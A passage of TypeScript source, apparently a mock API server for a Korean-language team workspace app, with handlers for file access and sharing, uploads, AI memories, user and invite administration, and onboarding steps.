      return this.devEnvSitesOf(c.user.id)
    },
    setMyDevEnvFullInternet: (c) => {
      const now_ = this.devEnvSitesOf(c.user.id)
      if (c.body.on && (now_.state !== 'on' || c.body.acceptWarning !== 1)) fail('conflict', 409, 'Accept the Full internet warning first.')
      this.devEnvSites.get(c.user.id)!.full = c.body.on
      return this.devEnvSitesOf(c.user.id)
    },
    updateDevEnvTeam: (c) => {
      const v = this.devEnvTeamView()
      const b = c.body
      const before = this.devEnvTeam
      const after = { ...before, limits: { ...before.limits, ...(b.limits ?? {}) }, ...(b.extraDomains ? { extraDomains: b.extraDomains } : {}), ...(b.scope ? { scope: b.scope } : {}), ...(b.network ? { network: b.network } : {}), ...(b.enabled !== undefined ? { enabled: b.enabled } : {}) }
      if (v.runner === 'srt' && after.enabled && !(before.enabled && before.consent?.warningVersion === v.warningVersion) && after.consent?.warningVersion !== v.warningVersion) {
        if (b.acceptWarning !== v.warningVersion) fail('conflict', 409, '먼저 개발 환경 경고를 확인해 주세요.')
        after.consent = { by: { id: c.user.id, name: c.user.name }, at: now(), warningVersion: v.warningVersion }
      }
      this.devEnvTeam = after
      return this.devEnvTeamView()
    },
    devEnvPreview: (c) => {
      this.devEnvOf(c.user, c.params.id!)
      return { url: `https://preview.example.invalid/${c.body.port}/`, expiresAt: new Date(Date.now() + 600_000).toISOString() }
    },
    // srt: the caller's runs and their cancel (the chat's waiting line, "devqueue" turns)
    myDevEnvRuns: (c) => {
      const srt = this.devEnv?.srt
      if (!srt) fail('not_found', 404)
      return { running: srt!.running.filter((r) => r.by?.id === c.user.id), waiting: srt!.waiting.filter((r) => r.by?.id === c.user.id) }
    },
    stopMyDevEnvRun: (c) => {
      const srt = this.devEnv?.srt
      if (!srt || ![...srt.running, ...srt.waiting].some((r) => r.id === c.params.runId && r.by?.id === c.user.id)) fail('not_found', 404)
      srt!.running = srt!.running.filter((r) => r.id !== c.params.runId)
      srt!.waiting = srt!.waiting.filter((r) => r.id !== c.params.runId)
      return { running: srt!.running.filter((r) => r.by?.id === c.user.id), waiting: srt!.waiting.filter((r) => r.by?.id === c.user.id) }
    },
    listMemories: () => ({ items: this.memories, nextCursor: null }),
    // like server/src/routes/memories.ts: folded to one line, 1–300 characters (the AI's limits), newest first
    createMemory: (c) => {
      const text = String(c.body.text).replace(/\s+/g, ' ').trim()
      if (!text) fail('validation', 400, '기억할 내용을 적어 주세요.', { 'body.text': 'empty' })
      if (text.length > 300) fail('validation', 400, `메모리는 한 줄에 300자까지 쓸 수 있어요(지금 ${text.length}자). 줄여 주세요.`, { 'body.text': 'too long' })
      const m: Memory = { id: uuidv7(), text, sourceChatId: null, createdAt: now() }
      this.memories.unshift(m)
      this.publish({ type: 'memory.changed', data: { change: 'created', memory: m } })
      return { status: 201, body: m }
    },
    updateMemory: (c) => {
      const m = this.memories.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const text = String(c.body.text).replace(/\s+/g, ' ').trim()
      if (!text) fail('validation', 400, '기억할 내용을 적어 주세요.', { 'body.text': 'empty' })
      if (text.length > 300) fail('validation', 400, `메모리는 한 줄에 300자까지 쓸 수 있어요(지금 ${text.length}자). 줄여 주세요.`, { 'body.text': 'too long' })
      m.text = text
      this.publish({ type: 'memory.changed', data: { change: 'updated', memory: m } })
      return m
    },
    deleteMemory: (c) => {
      this.memories = this.memories.filter((m) => m.id !== c.params.id)
      return undefined
    },
    clearMemories: () => {
      this.memories = []
      return undefined
    },

    tree: (c) => {
      const path = c.query.path ?? ''
      if (path && !this.files.has(path)) fail('not_found', 404)
      if (this.access(path, c.user) === 'none' && path !== 'secret') fail('not_found', 404)
      const kids = [...this.files.entries()].filter(([p]) => (path ? p.startsWith(path + '/') && !p.slice(path.length + 1).includes('/') : !p.includes('/')))
      const entries = kids
        .map(([p, n]) => this.entry(p, n, c.user))
        .filter((e) => !(e.path.startsWith('users/') && e.access === 'none'))
        .sort((a, b) => (a.type !== b.type ? (a.type === 'folder' ? -1 : 1) : a.name.localeCompare(b.name)))
      return { path, access: this.access(path, c.user), entries, nextCursor: null }
    },
    content: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      return { path: c.query.path, size: n!.data!.byteLength, mtime: n!.mtime, sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), mime: mimeOf(c.query.path!), binary: false, content: dec.decode(n!.data!), truncated: false, access: this.access(c.query.path!, c.user) }
    },
    saveContent: (c) => {
      let path: string = c.body.path
      if (this.access(path, c.user) !== 'write') fail('forbidden', 403)
      let conflict = false
      const cur = this.files.get(path)?.data
      if (cur && (c.body.baseSha256 === null || c.body.baseSha256 !== new Bun.CryptoHasher('sha256').update(cur).digest('hex'))) {
        conflict = true
        path = path.replace(/(\.[^.]+)?$/, (ext) => ` (충돌 사본 - ${c.user.name})${ext}`)
      }
      this.putFile(path, c.body.content)
      return { path, conflict, entry: this.entry(path, this.files.get(path)!, c.user) }
    },
    hwpPreview: async (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      // the HWP Preview plugin installed and turned off: refused like the server's disabled renderer (not installed at
      // all, the mock still renders, so the other previews need no install step)
      if (this.plugins.installed.some((p) => p.id === 'app.trina.hwp-preview' && !p.enabled)) throw new Fail('unavailable', 503, undefined, undefined, { reason: 'disabled' })
      try {
        const r = await (await hwpEngine).render(Buffer.from(n!.data!), c.query.path!.endsWith('.hwpx') ? 'hwpx' : 'hwp', Number(c.query.page))
        return { ...r.meta, id: crypto.randomUUID(), png: r.bytes.toString('base64') }
      } catch (e) { throw new Fail('unavailable', 503, undefined, undefined, { reason: e && typeof e === 'object' && 'reason' in e ? String(e.reason) : 'engine' }) }
    },
    download: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      // an HTML file's preview (lib/frame-files.ts): like server/src/team-files/embed.ts, only a file everyone who can
      // read the page can read too
      const embedIn = c.query.embedIn as string | undefined
      if (embedIn !== undefined) {
        if (!this.files.has(embedIn) || this.access(embedIn, c.user) === 'none') fail('not_found', 404)
        if (this.users.some((u) => u.status === 'active' && this.access(embedIn, u) !== 'none' && this.access(c.query.path!, u) === 'none'))
          throw new Fail('forbidden', 403, undefined, undefined, { reason: 'embed_narrower' })
      }
      return new Response(n!.data! as unknown as BodyInit, { headers: { 'content-type': mimeOf(c.query.path!) ?? 'application/octet-stream', 'content-length': String(n!.data!.byteLength), 'content-disposition': 'attachment', 'x-content-type-options': 'nosniff', 'content-security-policy': "sandbox; default-src 'none'" } })
    },
    upload: (c) => {
      const folder: string = c.body.folder
      if (this.access(folder, c.user) !== 'write') fail('forbidden', 403)
      const name = c.body.name ?? c.file!.name
      let path = folder ? `${folder}/${name}` : name
      if (this.files.has(path)) path = path.replace(/(\.[^.]+)?$/, (ext: string) => ` (2)${ext}`)
      return (async () => {
        const data = new Uint8Array(await c.file!.arrayBuffer())
        await this.uploadAnswer()
        this.putFile(path, data)
        this.publish({ type: 'files.changed', data: { changes: [{ path, action: 'create', by: { id: c.user.id, name: c.user.name }, turnId: null }] } })
        return { status: 201, body: this.entry(path, this.files.get(path)!, c.user) }
      })()
    },
    mkdir: (c) => {
      if (this.files.has(c.body.path)) fail('conflict', 409)
      this.files.set(c.body.path, { type: 'folder', mtime: now() })
      return { status: 201, body: this.entry(c.body.path, this.files.get(c.body.path)!, c.user) }
    },
    move: (c) => {
      const from: string = c.body.from
      const n = this.files.get(from) ?? fail('not_found', 404)
      if (this.access(from, c.user) !== 'write') fail('forbidden', 403)
      let to: string = c.body.to
      if (to === from) return { entry: this.entry(from, n, c.user) }
      if (this.files.has(to)) {
        if (c.body.onExists !== 'rename') fail('conflict', 409)
        to = this.freePath(to)
      }
      if (this.access(parentOf(to), c.user) !== 'write') fail('forbidden', 403)
      // like server/src/team-files/service.ts: into the mover's own users/<id>/ while other people can read it now
      const own = `users/${c.user.id}/`
      if (to.startsWith(own) && !from.startsWith(own) && !c.body.confirm) {
        const lost = this.users.filter((u) => u.id !== c.user.id && this.access(from, u) !== 'none' && this.access(to, u) === 'none').length
        if (lost > 0) throw new Fail('conflict', 409, undefined, undefined, { reason: 'audience_narrowed', lostViewers: lost })
      }
      for (const [p, v] of [...this.files.entries()]) {
        if (p === from || p.startsWith(from + '/')) {
          this.files.delete(p)
          this.files.set(to + p.slice(from.length), v)
        }
      }
      return { entry: this.entry(to, n, c.user) }
    },
    // share by copying (server/src/team-files/service.ts copy): files only; dryRun counts who would see it in addition
    copy: (c) => {
      const from: string = c.body.from
      const n = this.files.get(from)
      if (!n || this.access(from, c.user) === 'none') return fail('not_found', 404)
      if (n.type !== 'file') fail('validation', 400, 'a folder cannot be copied')
      let to: string = c.body.to
      const parent = parentOf(to)
      if (parent && this.files.get(parent)?.type !== 'folder') fail('not_found', 404)
      if (this.access(parent, c.user) !== 'write') fail('forbidden', 403)
      const viewersAdded = this.users.filter((u) => u.id !== c.user.id && this.access(to, u) !== 'none' && this.access(from, u) === 'none').length
      if (c.body.dryRun) return { viewersAdded }
      if (this.files.has(to)) {
        if (c.body.onExists === 'fail') fail('conflict', 409)
        if (c.body.onExists === 'rename') to = this.freePath(to)
      }
      this.putFile(to, n.data!)
      return { path: to, sha256: sha256Hex(n.data!) }
    },
    remove: (c) => {
      const n = this.files.get(c.query.path!) ?? fail('not_found', 404)
      this.files.delete(c.query.path!)
      const item = { id: uuidv7(), originalPath: c.query.path!, size: n.data?.byteLength ?? 0, deletedBy: { id: c.user.id, name: c.user.name }, turnId: null, deletedAt: now(), purgeAt: new Date(Date.now() + this.settings.trashRetentionDays * 86400_000).toISOString(), node: n }
      this.trash.push(item)
      return { trashId: item.id, purgeAt: item.purgeAt }
    },
    history: (c) => {
      const f = this.files.get(c.query.path!)
      const items = this.versions.filter((v) => v.path === c.query.path)
      const current = f?.data ? { version: Math.max(0, ...items.map((v) => v.version)) + 1, sha256: sha256Hex(f.data), size: f.data.byteLength, author: { id: 'olga', name: 'Olga' }, turnId: null, at: f.mtime } : null
      const events = current ? [{ id: 1, at: f!.mtime, kind: 'edited' as const, by: current.author, turnId: null, path: c.query.path!, from: null, size: current.size }] : []
      return { path: c.query.path, items, currentSha256: current?.sha256 ?? null, canRestore: this.access(c.query.path!, c.user) === 'write', current, events }
    },
    versionDownload: (c) => {
      const v = this.versions.find((x) => x.id === c.params.versionId) ?? fail('not_found', 404)
      return new Response(`version ${v.version}`, { headers: { 'content-disposition': 'attachment' } })
    },
    restoreVersion: (c) => {
      const v = this.versions.find((x) => x.id === c.body.versionId) ?? fail('not_found', 404)
      if (this.access(v.path, c.user) !== 'write') fail('forbidden', 403)
      this.versions.push({ ...v, id: uuidv7(), version: this.versions.filter((x) => x.path === v.path).length + 1, kind: 'restore', createdAt: now(), author: { id: c.user.id, name: c.user.name }, savedBy: null, savedTurnId: null })
      return { path: v.path, conflict: false, entry: this.entry(v.path, this.files.get(v.path)!, c.user) }
    },
    trash: () => ({ items: this.trash.map(({ node: _n, ...t }) => t), nextCursor: null }),
    restoreTrash: (c) => {
      const t = this.trash.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.trash = this.trash.filter((x) => x.id !== t.id)
      this.files.set(t.originalPath, t.node)
      return { entry: this.entry(t.originalPath, t.node, c.user) }
    },
    attachTeamFile: (c) => {
      const path: string = c.body.path
      const n = this.files.get(path)
      if (!n || n.type !== 'file' || this.access(path, c.user) === 'none') fail('not_found', 404)
      const name = path.slice(path.lastIndexOf('/') + 1)
      const mime = mimeOf(path) ?? 'application/octet-stream'
      const a: Attachment & { data: Uint8Array } = {
        id: uuidv7(), name, path, size: n!.data!.byteLength, mime, kind: mime.startsWith('image/') ? 'image' : 'text', source: 'team',
        sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), data: n!.data!,
      }
      this.attachments.set(a.id, a)
      return { status: 201, body: (({ data: _d, ...rest }) => rest)(a) }
    },
    findFiles: (c) => {
      const q = String(c.query.q ?? '').toLowerCase()
      const base = String(c.query.path ?? '')
      const items = [...this.files.entries()]
        // like the server (policy/authorize.ts visiblePath): download-only files are not search hits
        .filter(([p, n]) => n.type === 'file' && !this.downloadOnly.has(p) && (!base || p.startsWith(base + '/')) && p.slice(p.lastIndexOf('/') + 1).toLowerCase().includes(q) && this.access(p, c.user) !== 'none' && !(p.startsWith('users/') && !p.startsWith(`users/${c.user.id}/`)))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 50)), truncated: false }
    },
    recentFiles: (c) => {
      const items = [...this.files.entries()]
        .filter(([p, n]) => n.type === 'file' && !this.downloadOnly.has(p) && this.access(p, c.user) !== 'none' && !p.startsWith('users/'))
        .sort((a, b) => b[1].mtime.localeCompare(a[1].mtime))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 20)), truncated: false }
    },
    uploadAttachment: async (c) => {
      const data = new Uint8Array(await c.file!.arrayBuffer())
      await this.uploadAnswer()
      return { status: 201, body: this.makeAttachment(c.body.chatId, c.body.name ?? c.file!.name, data, c.file!.type, c.user) }
    },
    attachmentThumbnail: (c) => {
      const a = this.attachments.get(c.params.id!) ?? fail('not_found', 404)
      return new Response(a.data as unknown as BodyInit, { headers: { 'content-type': a.mime } })
    },
    createUploadSession: (c) => {
      if (c.body.target.kind === 'transcribe') this.transcribeGate(c.body.target.chatId)
      const s: UploadSession & { chunks: Map<number, Uint8Array> } = { id: uuidv7(), target: c.body.target, size: c.body.size, sha256: c.body.sha256, chunkSize: UPLOAD_CHUNK_SIZE, chunkCount: Math.ceil(c.body.size / UPLOAD_CHUNK_SIZE), received: [], expiresAt: new Date(Date.now() + 86400_000).toISOString(), chunks: new Map() }
      this.uploads.set(s.id, s)
      const { chunks: _x, ...out } = s
      return { status: 201, body: out }
    },
    uploadChunk: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      s.chunks.set(Number(c.params.n), new Uint8Array(await c.req.arrayBuffer()))
      s.received = [...s.chunks.keys()].sort((a, b) => a - b)
      return { received: s.received }
    },
    getUploadSession: (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      const { chunks: _x, ...out } = s
      return out
    },
    completeUploadSession: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      await this.uploadAnswer()
      const all = new Uint8Array(s.size)
      for (const [n, d] of s.chunks) all.set(d, n * s.chunkSize)
      const hash = new Bun.CryptoHasher('sha256').update(all).digest('hex')
      if (hash !== s.sha256) fail('conflict', 409, 'sha256 mismatch')
      this.uploads.delete(s.id)
      if (s.target.kind === 'path') {
        this.putFile(s.target.path, all)
        return { kind: 'path', entry: this.entry(s.target.path, this.files.get(s.target.path)!, c.user) }
      }
      if (s.target.kind === 'attachment') return { kind: 'attachment', attachment: this.makeAttachment(s.target.chatId, s.target.name, all, 'application/octet-stream', c.user) }
      return { kind: 'transcribe', jobId: this.transcribeJob(c.user) }
    },
    cancelUploadSession: (c) => {
      this.uploads.delete(c.params.id!)
      return undefined
    },
    listChatArtifacts: (c) => {
      const keys = [...new Set(this.artifacts.filter((a) => a.chatId === c.params.id).map((a) => a.key))]
      return { items: keys.map((key) => ({ key, versions: this.artifacts.filter((a) => a.chatId === c.params.id && a.key === key).sort((a, b) => b.version - a.version).map(({ content, ...s }) => ({ ...s, size: content.length })) })) }
    },
    getArtifact: (c) => this.artifacts.find((a) => a.id === c.params.id) ?? fail('not_found', 404),
    // a promo video's state (server/src/promo-video/render.ts): the mock never makes the MP4, so no button
    getPromoVideo: (c) => {
      const a = this.artifacts.find((x) => x.id === c.params.id && x.key === PROMO_ARTIFACT_KEY) ?? fail('not_found', 404)
      return { artifactId: a.id, chatId: a.chatId, title: a.title, style: PROMO_STYLES[0], duration: 18.5, mp4: { available: false, state: 'none' as const, seconds: null, bytes: null } }
    },
    // an intro deck's info (server/src/intro-deck/): the mock never builds the files, so neither download is offered
    getIntroDeck: (c) => {
      const a = this.artifacts.find((x) => x.id === c.params.id && x.key === DECK_ARTIFACT_KEY) ?? fail('not_found', 404)
      return { artifactId: a.id, chatId: a.chatId, title: a.title ?? '', theme: 'paper' as const, slides: 1, pptx: false, pdf: false }
    },
    getJob: (c) => this.jobs.get(c.params.id!) ?? fail('not_found', 404),
    cancelJob: (c) => {
      const j = this.jobs.get(c.params.id!) ?? fail('not_found', 404)
      j.status = 'canceled'
      return j
    },
    transcribe: (c) => {
      this.transcribeGate(c.body.chatId)
      return { status: 202, body: { jobId: this.transcribeJob(c.user) } }
    },
    pollCalls: () => ({ calls: [] }),
    postResult: () => undefined,

    listUsers: () => ({ items: this.users }),
    createUser: (c) => {
      checkTemp(c.body.temporaryPassword)
      if (this.users.some((x) => x.username.toLowerCase() === c.body.username.toLowerCase())) fail('conflict', 409, '이미 쓰고 있는 아이디예요.')
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: c.body.role, groupIds: c.body.groupIds ?? [], mustChangePassword: true, localeChoice: c.body.locale ?? null }, c.body.temporaryPassword ?? 'tiger4271')
      return { status: 201, body: { user: u, temporaryPassword: c.body.temporaryPassword ?? 'tiger4271', expiresAt: tempUntil(), signInUrl: 'https://team.example.com' } }
    },
    updateUser: (c) => {
      const { locale, ...rest } = c.body
      const u = Object.assign(this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(rest).filter(([, v]) => v !== undefined)))
      if (locale !== undefined) u.localeChoice = locale
      this.syncLocales()
      return u
    },
    deleteUser: (c) => {
      this.users = this.users.filter((u) => u.id !== c.params.id)
      return undefined
    },
    resetPassword: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      checkTemp(c.body?.temporaryPassword)
      const temp = c.body?.temporaryPassword ?? 'maple0385'
      this.passwords.set(u!.username, temp)
      u!.mustChangePassword = true
      this.resets.set(u!.id, { by: { id: c.user.id, name: c.user.name }, at: now() })
      return { temporaryPassword: temp, expiresAt: tempUntil(), signInUrl: 'https://team.example.com' }
    },
    // like server/src/admin/users.ts transferOwnership: the password again, then the old owner becomes an admin
    transferOwnership: (c) => {
      if (this.passwords.get(c.user.username) !== c.body.password) fail('forbidden', 403, '비밀번호가 맞지 않아요. 다시 입력해 주세요.')
      const u = this.users.find((x) => x.id === c.body.userId && x.status === 'active') ?? fail('not_found', 404)
      if (u.id === c.user.id) fail('forbidden', 403)
      for (const x of this.users) if (x.role === 'owner') x.role = 'admin'
      u.role = 'owner'
      return { ok: true as const }
    },
    createResetLink: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      if (u.role === 'owner') fail('forbidden', 403)
      const token = 'rst' + uuidv7().replace(/-/g, '')
      return { token, url: `/reset-password/${token}`, expiresAt: new Date(Date.now() + 24 * 3600_000).toISOString() }
    },
    listInvites: () => ({ items: this.invites.map(({ token: _t, ...i }) => i) }),
    createInvite: (c) => {
      const token = 'inv' + uuidv7().replace(/-/g, '')
      const i = { id: uuidv7(), role: c.body.role ?? 'member', groupIds: c.body.groupIds ?? [], createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInHours ?? 72) * 3600_000).toISOString(), usedAt: null, usedBy: null, token }
      this.invites.push(i)
      const { token: _t, ...invite } = i
      return { status: 201, body: { invite, token, url: `/invite/${token}` } }
    },
    revokeInvite: (c) => {
      this.invites = this.invites.filter((i) => i.id !== c.params.id)
      return undefined
    },
    // the team invite link, like server/src/auth/team-links.ts (no plan: no seat limit, 20 uses by default)
    getTeamLink: (c) => this.teamLinkResponse(c.req, c.user),
    createTeamLink: (c) => {
      if (this.teamLink) this.revokedTeamLinks.add(this.teamLink.token)
      const token = 'tl' + uuidv7().replace(/-/g, '')
      this.teamLink = { id: uuidv7(), token, groupIds: c.body.groupIds ?? [], skillPath: c.body.skillPath ?? null, starter: c.body.skillPath ? (c.body.starter ?? null) : null, maxUses: c.body.maxUses ?? 20, uses: 0, createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInDays ?? 14) * 86_400_000).toISOString() }
      return { status: 201, body: this.teamLinkResponse(c.req, c.user) }
    },
    // like the server: the open link's skill and starter change and groups are added; its address stays
    updateTeamLink: (c) => {
      const l = this.teamLink
      if (!l || l.uses >= l.maxUses) fail('not_found', 404)
      const b = c.body as { skillPath?: string | null; starter?: TeamLinkStarter | null; addGroupIds?: string[] }
      if ((b.addGroupIds ?? []).some((g) => !this.groups.some((x) => x.id === g))) fail('validation', 400, '없는 그룹이 들어 있어요.', { 'body.addGroupIds': 'unknown group' })
      if (b.skillPath !== undefined) l!.skillPath = b.skillPath
      if (b.starter !== undefined) l!.starter = b.starter
      if (!l!.skillPath) l!.starter = null
      l!.groupIds = [...new Set([...l!.groupIds, ...(b.addGroupIds ?? [])])]
      return this.teamLinkResponse(c.req, c.user)
    },
    revokeTeamLink: () => {
      if (!this.teamLink) fail('not_found', 404)
      this.revokedTeamLinks.add(this.teamLink!.token)
      this.teamLink = null
      return undefined
    },
    teamLinkInfo: (c) => {
      const l = this.teamLink?.token === c.body.token ? this.teamLink : null
      if (!l && this.revokedTeamLinks.has(c.body.token)) return { teamName: this.settings.teamName, valid: false, problem: 'revoked', expiresAt: now(), skillName: null }
      if (!l) fail('not_found', 404)
      const problem = l!.uses >= l!.maxUses ? 'used_up' : null
      const skill = l!.skillPath ? this.teamLinkSkill(l!.skillPath) : null
      return { teamName: this.settings.teamName, valid: !problem, problem, expiresAt: l!.expiresAt, skillName: skill?.name ?? null, skillTitle: skill?.title ?? null }
    },
    joinTeamLink: (c) => {
      const l = this.teamLink?.token === c.body.token ? this.teamLink : null
      if (!l && !this.revokedTeamLinks.has(c.body.token)) fail('not_found', 404)
      if (!l) fail('gone', 410, '더 이상 쓰지 않는 초대 링크예요. 링크를 보낸 분께 새 링크를 부탁해 주세요.')
      if (l!.uses >= l!.maxUses) fail('gone', 410, '이 링크로 들어올 수 있는 인원이 다 찼어요. 링크를 보낸 분께 새 링크를 부탁해 주세요.')
      if (this.users.some((u) => u.username.toLowerCase() === c.body.username.toLowerCase())) fail('conflict', 409, '이미 쓰고 있는 아이디예요.', { 'body.username': 'taken' })
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: 'member', groupIds: l!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
      l!.uses++
      const next = l!.skillPath && this.teamLinkSkillName(l!.skillPath) ? `/skills?run=${encodeURIComponent(l!.skillPath)}` : null
      // the starter as the new member may use it: the skill they can open, the files that exist and they can read
      const skill = l!.skillPath ? this.skillsFor(u).find((x) => x.path === l!.skillPath && !x.personal) : undefined
      const files = (l!.starter?.files ?? []).filter((f) => this.files.get(f)?.type === 'file' && this.access(f, u) !== 'none').map((f) => ({ path: f, name: f.slice(f.lastIndexOf('/') + 1) }))
      const by = this.users.find((x) => x.id === l!.createdBy.id)?.name ?? null
      // who made the link's skill (S): the line above its form, or Home's arrival for a skill that asks nothing
      const maker = l!.skillPath ? this.users.find((x) => x.id === this.skillMakers.get(l!.skillPath!))?.name ?? null : null
      const filesStarter = l!.starter && skill && files.length ? { kind: l!.starter.kind, skill: { path: skill.path, name: skill.name, title: skill.title ?? skill.name }, files, by } : null
      const starter = filesStarter ?? (skill && maker && !skill.inputs?.length ? { kind: 'skill' as const, skill: { path: skill.path, name: skill.name, title: skill.title ?? skill.name }, files: [], by: maker } : null)
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, ''), next, starter, skillBy: maker } }
    },
    // onboarding A, B, D: the scripted AI answers everyone, there is no hosting trial credit and no company profile yet
    // (the composer's "no AI" line, Admin › AI connections and the skill forms ask for these on their own)
    getAiAccess: (c) => ({ usable: true, action: c.user.role === 'owner' ? 'connect_team' : 'ask_owner', requested: false }),
    requestAiAccess: () => fail('forbidden', 403, '이미 AI를 쓸 수 있어요.'),
    trialCredit: () => ({ credit: null }),
    getCompanyProfile: () => ({ profile: this.companyProfile }),
    saveCompanyProfile: (c) => (this.companyProfile = { ...(c.body as import('@mycel/shared/api').CompanyProfileInput), updatedAt: now() }),
    // the website reading (server/src/onboarding/draft.ts, short): running for its first read, then a draft made from the
    // team's name; like the server, its chat is not in the chat list (server/src/chat/internal-chats.ts)
    startProfileDraft: (c) => {
      const b = c.body as import('@mycel/shared/api').StartProfileDraft
      const website = b.website ? normalizeWebsite(b.website) ?? '' : ''
      const id = uuidv7()
      this.profileDrafts.set(id, { userId: c.user.id, website, reads: 0 })
      return { status: 201, body: { chatId: id, website, site: website ? new URL(website).host.replace(/^www\./, '') : null } }
    },
    getProfileDraft: (c) => {
      const d = this.profileDrafts.get(c.params.chatId)
      if (!d || d.userId !== c.user.id) fail('not_found', 404)
      const base = { website: d!.website, error: null, steps: [], writing: false, assets: { images: 0, logo: false, colors: ['#1b6e3a'] } }
      if (++d!.reads < 2) return { ...base, status: 'running', draft: null, writing: true }
      const team = this.settings.teamName
      return { ...base, status: 'done', draft: { website: d!.website, name: team, oneLine: `${team}는 조용한 책상 선풍기를 만들어요`, products: '책상 선풍기', audience: '작은 사무실', tone: ['친근한'], avoid: '',
        sources: d!.website ? [{ field: 'oneLine', url: d!.website, excerpt: '조용한 책상 선풍기' }] : [] } }
    },
    // the welcome steps (server/src/onboarding/welcome.ts, the same rules in short): one record, the pack once
    getWelcome: () => ({ progress: this.welcome }),
    updateWelcome: (c) => {
      const at = now()
      const p: WelcomeProgress = this.welcome ?? { startedAt: at, updatedAt: at, teamType: null, steps: { profile: null, result: null, invite: null }, pack: null, resultChatId: null, inviteShownAt: null, site: null, dismissedAt: null, finishedAt: null }
      const b = c.body as import('@mycel/shared/api').WelcomeUpdate
      if (b.resultChatId !== undefined) {
        if (!this.chats.some((x) => x.id === b.resultChatId)) fail('not_found', 404)
        p.resultChatId = b.resultChatId
      }
      if (b.teamType) p.teamType = b.teamType
      if (b.step) {
        if (b.step.state === 'done' || p.steps[b.step.id] !== 'done') p.steps[b.step.id] = b.step.state
        if (b.step.id === 'result' && b.step.state === 'done' && p.steps.invite === 'skipped') p.steps.invite = null
      }
      if (b.inviteShown && !p.inviteShownAt) p.inviteShownAt = at
      if (b.site) p.site = b.site
      if (b.dismissed !== undefined) p.dismissedAt = b.dismissed ? (p.dismissedAt ?? at) : null
      // "자료 없이 해 볼게요" without the marketing pack: the result and the invite put off, the steps finished
      if (b.finish) {
        if (p.steps.result !== 'done') p.steps.result = 'skipped'
        p.steps.invite ??= 'skipped'
        p.finishedAt ??= at
      }
      if (!p.finishedAt && p.steps.profile === 'done' && p.steps.result === 'done' && p.steps.invite) p.finishedAt = at
      p.updatedAt = at
      this.welcome = p
      return { progress: p }
    },
    installWelcomePack: (c) => {
      const at = now()
      const p = (this.handlers.updateWelcome!({ ...c, body: {} }) as { progress: WelcomeProgress }).progress
      if (p.pack) return { progress: p, install: null, outcome: 'already' }
      for (const d of ['skills/marketing', 'skills/marketing/ad-copy']) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
      this.putFile(WELCOME_RESULT_SKILL, '---\nname: ad-copy\ndescription: 광고 문구 — 광고 문구 3안\nmetadata:\n  title: 광고 문구\n---\n# 광고 문구\n')
      p.pack = { id: 'marketing', at, skillPath: WELCOME_RESULT_SKILL }
      return { progress: p, install: { pack: 'marketing', locale: this.settings.defaultLocale, skills: [{ name: 'ad-copy', path: WELCOME_RESULT_SKILL, status: 'created' }], folders: [] }, outcome: 'installed' }
    },
    // every team's start (server/src/onboarding/welcome.ts): the general pack once, and the team's group (named after
    // the team, the owner in it) with groups/<name>/, its meeting notes folder and its brand folder, once
    setupWelcomeTeam: (c) => {
      const at = now()
      const p = (this.handlers.updateWelcome!({ ...c, body: {} }) as { progress: WelcomeProgress }).progress
      let install = null
      if (!p.general) {
        const skills = [['meeting-tasks', GENERAL_TASKS_SKILL, '할 일 정리'], ['doc-brief', GENERAL_BRIEF_SKILL, '핵심 정리'], ['card-news', GENERAL_CARDNEWS_SKILL, '카드뉴스'], ['promo-video', GENERAL_PROMO_SKILL, '홍보 영상'], ['intro-deck', GENERAL_DECK_SKILL, '회사 소개서']] as const
        for (const [name, path, title] of skills) {
          for (const d of ['skills/general', `skills/general/${name}`]) this.files.set(d, this.files.get(d) ?? { type: 'folder', mtime: at })
          if (!this.files.has(path)) this.putFile(path, path === GENERAL_CARDNEWS_SKILL ? CARDNEWS_TEXT : path === GENERAL_PROMO_SKILL ? PROMO_TEXT : path === GENERAL_DECK_SKILL ? DECK_TEXT : `---\nname: ${name}\ndescription: ${title}\nmetadata:\n  title: ${title}\n---\n# ${title}\n`)
        }
        p.general = { at, tasksPath: GENERAL_TASKS_SKILL, briefPath: GENERAL_BRIEF_SKILL, cardNewsPath: GENERAL_CARDNEWS_SKILL, promoVideoPath: GENERAL_PROMO_SKILL, introDeckPath: GENERAL_DECK_SKILL }
        install = { pack: 'general' as const, locale: this.settings.defaultLocale, skills: skills.map(([name, path]) => ({ name, path, status: 'created' as const })), folders: [] }
      }
      if (!p.teamGroup) {
        // like server/src/onboarding/welcome.ts: a group these steps did not make is never taken over ("Acme 2")
        const team = this.settings.teamName
        const taken = (n: string) => this.groups.some((x) => x.name.toLowerCase() === n.toLowerCase())
        const name = !taken(team) ? team : [2, 3, 4, 5, 6, 7, 8, 9].map((n) => `${team} ${n}`).find((n) => !taken(n)) ?? `${team} ${Date.now()}`
